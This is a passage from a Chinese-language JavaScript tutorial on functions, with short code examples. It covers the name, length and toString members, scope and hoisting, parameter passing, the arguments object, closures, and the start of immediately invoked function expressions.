<p><code>name</code>属性的一个用处，就是获取参数函数的名字，下面代码中，函数<code>test</code>内部通过<code>name</code>属性，就可以知道传入的参数是什么函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myFunc = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(f.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test(myFunc) <span class="comment">// myFunc</span></span><br></pre></td></tr></table></figure>

<h5 id="5-2-2-length属性"><a href="#5-2-2-length属性" class="headerlink" title="5.2.2 length属性"></a>5.2.2 length属性</h5><p>函数的length属性返回函数预期传入的参数个数，即函数定义之中的参数个数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a, b</span>) </span>&#123;&#125;</span><br><span class="line">f.length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p><code>length</code>属性提供了一种机制，判断定义时和调用时参数的差异，以便实现面向对象编程的“方法重载”（overload）</p>
<h5 id="5-2-3-toString"><a href="#5-2-3-toString" class="headerlink" title="5.2.3 toString()"></a>5.2.3 toString()</h5><p>函数的toString()方法返回一个字符串，内容是函数的源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  a();</span><br><span class="line">  b();</span><br><span class="line">  c();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f.toString()</span><br><span class="line"><span class="comment">// function f() &#123;</span></span><br><span class="line"><span class="comment">//  a();</span></span><br><span class="line"><span class="comment">//  b();</span></span><br><span class="line"><span class="comment">//  c();</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
<p>对于那些原生的函数，<code>toString()</code>方法返回<code>function ()&#123;[native code]&#125;</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.sqrt.toString()</span><br><span class="line"><span class="comment">// &quot;function sqrt() &#123; [native code] &#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>函数内部的注释也可以返回，利用这一点，可以变相实现多行字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> multiline = <span class="function"><span class="keyword">function</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = fn.toString().split(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> arr.slice(<span class="number">1</span>, arr.length - <span class="number">1</span>).join(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment">  这是一个</span></span><br><span class="line"><span class="comment">  多行注释</span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br><span class="line"></span><br><span class="line">multiline(f);</span><br><span class="line"><span class="comment">// &quot; 这是一个</span></span><br><span class="line"><span class="comment">//   多行注释&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面示例中，函数f内部有一个多行注释，toString()方法拿到f的源码后，去掉首尾两行，就得到了一个多行字符串</p>
<h4 id="5-3函数的作用域"><a href="#5-3函数的作用域" class="headerlink" title="5.3函数的作用域"></a>5.3函数的作用域</h4><h5 id="5-3-1定义"><a href="#5-3-1定义" class="headerlink" title="5.3.1定义"></a>5.3.1定义</h5><p>作用域（scope）指的是变量存在的范围。在 ES5 的规范中，JavaScript 只有两种作用域：一种是全局作用域，变量在整个程序中一直存在，所有地方都可以读取；另一种是函数作用域，变量只在函数内部存在。ES6 又新增了块级作用域，后面再写<br>对于顶层函数来说，函数外部声明的变量就是全局变量（global variable），它可以在函数内部读取</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> v = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f()</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>在函数内部定义的变量，外部无法读取，称为“局部变量”（local variable）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> v = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v <span class="comment">// ReferenceError: v is not defined</span></span><br></pre></td></tr></table></figure>

<p>函数内部定义的变量，会在该作用域内覆盖同名全局变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> v = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> v = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// 2</span></span><br><span class="line">v <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>注意，对于var命令来说，局部变量只能在函数内部声明，在其他区块中声明，一律都是全局变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(x);  <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，变量x在条件判断区块之中声明，结果就是一个全局变量，可以在区块之外读取</p>
<h5 id="5-3-2-函数内部的变量提升"><a href="#5-3-2-函数内部的变量提升" class="headerlink" title="5.3.2 函数内部的变量提升"></a>5.3.2 函数内部的变量提升</h5><p>与全局作用域一样，函数作用域内部也会产生“变量提升”现象。<code>var</code>命令声明的变量，不管在什么位置，变量声明都会被提升到函数体的头部</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp = x - <span class="number">100</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp;</span><br><span class="line">  <span class="keyword">if</span> (x &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    tmp = x - <span class="number">100</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="5-3-3-函数本身的作用域"><a href="#5-3-3-函数本身的作用域" class="headerlink" title="5.3.3 函数本身的作用域"></a>5.3.3 函数本身的作用域</h5><p>函数本身也是一个值，也有自己的作用域。它的作用域与变量一样，就是其声明时所在的作用域，与其运行时所在的作用域无关</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> x = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">  x();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>x</code>是在函数<code>f</code>的外部声明的，所以它的作用域绑定外层，内部变量<code>a</code>不会到函数<code>f</code>体内取值，所以输出<code>1</code>，而不是<code>2</code><br>总之，函数执行时所在的作用域，是定义时的作用域，而不是调用时所在的作用域<br>很容易犯错的一点是，如果函数A调用函数B，却没考虑到函数B不会引用函数A的内部变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">  f();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">y(x)</span><br><span class="line"><span class="comment">// ReferenceError: a is not defined</span></span><br></pre></td></tr></table></figure>
<p>上面代码将函数x作为参数，传入函数y。但是，函数x是在函数y体外声明的，作用域绑定外层，因此找不到函数y的内部变量a，导致报错<br>同样的，函数体内部声明的函数，作用域绑定函数体内部</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> f = foo();</span><br><span class="line">f() <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>foo</code>内部声明了一个函数<code>bar</code>，<code>bar</code>的作用域绑定<code>foo</code>。当我们在<code>foo</code>外部取出<code>bar</code>执行时，变量<code>x</code>指向的是<code>foo</code>内部的<code>x</code>，而不是<code>foo</code>外部的<code>x</code>。正是这种机制，构成了“闭包”现象</p>
<h4 id="5-4-参数"><a href="#5-4-参数" class="headerlink" title="5.4 参数"></a>5.4 参数</h4><h5 id="5-4-1-概述"><a href="#5-4-1-概述" class="headerlink" title="5.4.1 概述"></a>5.4.1 概述</h5><p>函数运行的时候，有时需要提供外部数据，不同的外部数据会得到不同的结果，这种外部数据就叫参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">square</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">square(<span class="number">2</span>) <span class="comment">// 4</span></span><br><span class="line">square(<span class="number">3</span>) <span class="comment">// 9</span></span><br></pre></td></tr></table></figure>
<p>上式的x就是square函数的参数。每次运行的时候，需要提供这个值，否则得不到结果</p>
<h5 id="5-4-2-参数的省略"><a href="#5-4-2-参数的省略" class="headerlink" title="5.4.2 参数的省略"></a>5.4.2 参数的省略</h5><p>函数参数不是必需的，JavaScript 允许省略参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment">// 1</span></span><br><span class="line">f(<span class="number">1</span>) <span class="comment">// 1</span></span><br><span class="line">f() <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">f.length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>但是，没有办法只省略靠前的参数，而保留靠后的参数,如果省略第一个参数，就会报错。如果一定要省略靠前的参数，只有显式传入<code>undefined</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f( , <span class="number">1</span>) <span class="comment">// SyntaxError: Unexpected token ,(…)</span></span><br><span class="line">f(<span class="literal">undefined</span>, <span class="number">1</span>) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<h5 id="5-4-3-传递方式"><a href="#5-4-3-传递方式" class="headerlink" title="5.4.3 传递方式"></a>5.4.3 传递方式</h5><p>函数参数如果是原始类型的值（数值、字符串、布尔值），传递方式是传值传递（passes by value）。这意味着，在函数体内修改参数值，不会影响到函数外部</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">p</span>) </span>&#123;</span><br><span class="line">  p = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">f(p);</span><br><span class="line"></span><br><span class="line">p <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，变量<code>p</code>是一个原始类型的值，传入函数<code>f</code>的方式是传值传递。因此，在函数内部，<code>p</code>的值是原始值的拷贝，无论怎么修改，都不会影响到原始值</p>
<p>但是，如果函数参数是复合类型的值（数组、对象、其他函数），传递方式是传址传递（pass by reference）。也就是说，传入函数的原始值的地址，因此在函数内部修改参数，将会影响到原始值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="number">1</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  o.p = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">f(obj);</span><br><span class="line"></span><br><span class="line">obj.p <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，传入函数<code>f</code>的是参数对象<code>obj</code>的地址。因此，在函数内部修改<code>obj</code>的属性<code>p</code>，会影响到原始值</p>
<p>注意，如果函数内部修改的，不是参数对象的某个属性，而是替换掉整个参数，这时不会影响到原始值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  o = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line">f(obj);</span><br><span class="line"></span><br><span class="line">obj <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，在函数<code>f()</code>内部，参数对象<code>obj</code>被整个替换成另一个值。这时不会影响到原始值。这是因为，形式参数（<code>o</code>）的值实际是参数<code>obj</code>的地址，重新对<code>o</code>赋值导致<code>o</code>指向另一个地址，保存在原地址上的值当然不受影响</p>
<h5 id="5-4-4-同名参数"><a href="#5-4-4-同名参数" class="headerlink" title="5.4.4 同名参数"></a>5.4.4 同名参数</h5><p>如果有同名的参数，则取最后出现的那个值，即使后面的<code>a</code>没有值或被省略，也是以其为准</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a, a</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 2</span></span><br><span class="line">------------------</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a, a</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>如果要获得第一个a的值，可以使用arguments对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a, a</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<h5 id="5-4-5-arguments对象"><a href="#5-4-5-arguments对象" class="headerlink" title="5.4.5 arguments对象"></a>5.4.5 arguments对象</h5><h6 id="5-4-5-1-定义"><a href="#5-4-5-1-定义" class="headerlink" title="5.4.5.1 定义"></a>5.4.5.1 定义</h6><p>由于 JavaScript 允许函数有不定数目的参数，所以需要一种机制，可以在函数体内部读取所有参数。这就是<code>arguments</code>对象的由来<br><code>arguments</code>对象包含了函数运行时的所有参数，<code>arguments[0]</code>就是第一个参数，<code>arguments[1]</code>就是第二个参数，以此类推。这个对象只有在函数体内部，才可以使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params">one</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

<p>正常模式下，<code>arguments</code>对象可以在运行时修改</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">arguments</span>[<span class="number">0</span>] = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">arguments</span>[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">1</span>) <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>

<p>严格模式下，arguments对象与函数参数不具有联动关系。也就是说，修改arguments对象不会影响到实际的函数参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>; <span class="comment">// 开启严格模式</span></span><br><span class="line">  <span class="built_in">arguments</span>[<span class="number">0</span>] = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">arguments</span>[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">1</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<p>通过<code>arguments</code>对象的<code>length</code>属性，可以判断函数调用时到底带几个参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">arguments</span>.length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment">// 3</span></span><br><span class="line">f(<span class="number">1</span>) <span class="comment">// 1</span></span><br><span class="line">f() <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<h6 id="5-4-5-2-与数组的关系"><a href="#5-4-5-2-与数组的关系" class="headerlink" title="5.4.5.2 与数组的关系"></a>5.4.5.2 与数组的关系</h6><p>需要注意的是，虽然<code>arguments</code>很像数组，但它是一个对象。数组专有的方法（比如<code>slice</code>和<code>forEach</code>），不能在<code>arguments</code>对象上直接使用</p>
<p>如果要让<code>arguments</code>对象使用数组方法，真正的解决方法是将<code>arguments</code>转为真正的数组。下面是两种常用的转换方法：<code>slice</code>方法和逐一填入新数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">var</span> args = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">  args.push(<span class="built_in">arguments</span>[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="5-4-5-3-callee属性"><a href="#5-4-5-3-callee属性" class="headerlink" title="5.4.5.3 callee属性"></a>5.4.5.3 callee属性</h6><p>arguments对象带有一个callee属性，返回它所对应的原函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>.callee === f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>可以通过arguments.callee，达到调用函数自身的目的。这个属性在严格模式里面是禁用的，因此不建议使用</p>
<h4 id="5-5-函数的其它知识点"><a href="#5-5-函数的其它知识点" class="headerlink" title="5.5 函数的其它知识点"></a>5.5 函数的其它知识点</h4><h5 id="5-5-1-闭包"><a href="#5-5-1-闭包" class="headerlink" title="5.5.1 闭包"></a>5.5.1 闭包</h5><p>闭包（closure）是 JavaScript 语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现<br>理解闭包，首先必须理解变量作用域。前面提到，JavaScript 有两种作用域：全局作用域和函数作用域。<br>函数内部可以直接读取全局变量，但是，正常情况下，函数外部无法读取函数内部声明的变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> n = <span class="number">999</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(n)</span><br><span class="line"><span class="comment">// Uncaught ReferenceError: n is not defined(</span></span><br></pre></td></tr></table></figure>
<p>如果出于种种原因，需要得到函数内的局部变量。正常情况下，这是办不到的，只有通过变通方法才能实现。那就是在函数的内部，再定义一个函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> n = <span class="number">999</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">　　<span class="built_in">console</span>.log(n); <span class="comment">// 999</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>f2</code>就在函数<code>f1</code>内部，这时<code>f1</code>内部的所有局部变量，对<code>f2</code>都是可见的。但是反过来就不行，<code>f2</code>内部的局部变量，对<code>f1</code>就是不可见的。这就是 JavaScript 语言特有的”链式作用域”结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立<br>既然f2可以读取f1的局部变量，那么只要把f2作为返回值，我们不就可以在f1外部读取它的内部变量了吗！</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> n = <span class="number">999</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(n);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> f2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = f1();</span><br><span class="line">result(); <span class="comment">// 999</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>f1</code>的返回值就是函数<code>f2</code>，由于<code>f2</code>可以读取<code>f1</code>的内部变量，所以就可以在外部获得<code>f1</code>的内部变量了</p>
<p>闭包就是函数f2，即能够读取其他函数内部变量的函数。由于在 JavaScript 语言中，只有函数内部的子函数才能读取内部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数”。闭包最大的特点，就是它可以“记住”诞生的环境，比如f2记住了它诞生的环境f1，所以从f2可以得到f1的内部变量。在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁</p>
<p>闭包的最大用处有两个，一个是可以读取外层函数内部的变量，另一个就是让这些变量始终保持在内存中，即闭包可以使得它诞生环境一直存在。请看下面的例子，闭包使得内部变量记住上一次调用时的运算结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createIncrementor</span>(<span class="params">start</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> start++;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> inc = createIncrementor(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">inc() <span class="comment">// 5</span></span><br><span class="line">inc() <span class="comment">// 6</span></span><br><span class="line">inc() <span class="comment">// 7</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>start</code>是函数<code>createIncrementor</code>的内部变量。通过闭包，<code>start</code>的状态被保留了，每一次调用都是在上一次调用的基础上进行计算。从中可以看到，闭包<code>inc</code>使得函数<code>createIncrementor</code>的内部环境，一直存在。所以，闭包可以看作是函数内部作用域的一个接口</p>
<p>为什么闭包能够返回外层函数的内部变量？原因是闭包（上例的<code>inc</code>）用到了外层变量（<code>start</code>），导致外层函数（<code>createIncrementor</code>）不能从内存释放。只要闭包没有被垃圾回收机制清除，外层函数提供的运行环境也不会被清除，它的内部变量就始终保存着当前值，供闭包读取</p>
<p>闭包的另一个用处，是封装对象的私有属性和私有方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _age;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setAge</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    _age = n;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _age;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    name: name,</span><br><span class="line">    getAge: getAge,</span><br><span class="line">    setAge: setAge</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p1 = Person(<span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line">p1.setAge(<span class="number">25</span>);</span><br><span class="line">p1.getAge() <span class="comment">// 25</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>Person</code>的内部变量<code>_age</code>，通过闭包<code>getAge和setAge</code>，变成了返回对象<code>p1</code>的私有变量<br>注意，外层函数每次运行，都会生成一个新的闭包，而这个闭包又会保留外层函数的内部变量，所以内存消耗很大。因此不能滥用闭包，否则会造成网页的性能问题</p>
<h5 id="5-5-2-立即调用的函数表达式（IIFE）"><a href="#5-5-2-立即调用的函数表达式（IIFE）" class="headerlink" title="5.5.2 立即调用的函数表达式（IIFE）"></a>5.5.2 立即调用的函数表达式（IIFE）</h5><p>根据 JavaScript 的语法，圆括号<code>()</code>跟在函数名之后，表示调用该函数。比如，<code>print()</code>就表示调用<code>print</code>函数<br>有时，我们需要在定义函数之后，立即调用该函数。这时，你不能在函数的定义之后加上圆括号，这会产生语法错误</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;();</span><br><span class="line"><span class="comment">// SyntaxError: Unexpected token (</span></span><br></pre></td></tr></table></figure>
<p>产生这个错误的原因是，<code>function</code>这个关键字即可以当作语句，也可以当作表达式</p>
